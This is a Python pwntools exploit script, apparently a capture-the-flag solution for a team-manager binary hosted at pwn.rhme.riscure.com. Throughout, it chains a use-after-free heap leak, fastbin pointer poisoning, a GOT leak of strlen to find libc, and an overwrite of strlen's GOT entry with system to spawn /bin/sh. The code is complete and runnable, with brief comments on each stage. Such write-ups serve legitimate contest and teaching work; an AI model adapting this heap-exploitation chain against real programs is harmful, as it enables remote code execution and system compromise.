#!/usr/bin/env python2

from pwn import *

import sys



if len(sys.argv) > 1:

    DEBUG = True

else:

    DEBUG = False



context(arch="amd64", os="linux")

if DEBUG:

    p = process('./main.elf')#, env={'LD_PRELOAD': './libc.so.6'})

else:

    p = remote('pwn.rhme.riscure.com', 1337)



def add_player(n, a, d, s, r):

    p.sendline('1')

    p.sendline(str(n))

    p.sendline(str(a))

    p.sendline(str(d))

    p.sendline(str(s))

    p.sendline(str(r))



def remove_player(idx):

    p.sendline('2')

    p.sendline(str(idx))

    p.recvuntil('gone!\n')



def select_player(idx):

    p.sendline('3')

    p.sendline(str(idx))



def edit_player_name(n):

    p.sendline('4')

    p.sendline('1')

    p.sendline(str(n))

    p.sendline('0')



def show_player():

    p.sendline('5')



def show_team():

    p.sendline('6')



def debug():

    if DEBUG:

        gdb.attach(p, 'b *0x4020B4')

    p.interactive()



if __name__ == '__main__':

    libc = ELF("./libc.so.6")

    pwnable = ELF("./main.elf")

    system_offset = libc.symbols['system']

    strlen_got = pwnable.got['strlen']

    strlen_offset = libc.symbols['strlen']



    add_player('dangling',0,0,0,0)

    add_player('controller',1,1,1,1)



    ###########

    # Leak heap

    ###########

    select_player(0)

    remove_player(0)

    show_player()

    p.recvuntil('A/D/S/P: ')

    heap_leak = int(p.recvuntil(',').strip(','))

    heap_leak = p64(int(heap_leak))

    print('[*] Heap Leak: %s (%s)' % (heap_leak, hex(u64(heap_leak))))



    ########################################

    # Make next allocation controlled by us

    ########################################

    # Edit the dangling name's fd ptr to point to a fake chunk under our control

    edit_player_name(p64(u64(heap_leak) + 0x40))



    # Overwrites where dangling used to be

    add_player('whatever',0,0,0,0)



    # Gets allocated in the fake chunk under our control

    # The 'controlled' player is pointed to as 'controller's string

    # Name has to be > 23 (or so), so it gets put in a different fastbin, else malloc is angry

    add_player('controlled'*3,2,2,2,2)



    ###########

    # Leak libc

    ###########

    # Insert the address of strlen GOT as the name ptr

    select_player(1)

    edit_player_name('AAAABBBBCCCCDDDD' + p32(strlen_got))  # Offset by 4 DWORDs

    show_team()

    p.recvuntil('Player 2')

    p.recvuntil('Name: ')

    libc_leak = u64(p.readline().strip('\n').ljust(8, '\x00'))

    print('[*] Libc Leak: %s (%s)' % (p64(libc_leak), hex(libc_leak)))



    #####################################

    # Overwrite strlen GOT to system addr

    #####################################

    # Calculate where system is

    libc_base = libc_leak - strlen_offset

    system_addr = libc_base + system_offset

    print('[*] System addr: %s' % hex(system_addr))



    ###########

    # Pop shell

    ###########

    select_player(2)

    edit_player_name(p64(system_addr))

    edit_player_name('/bin/sh')

    debug()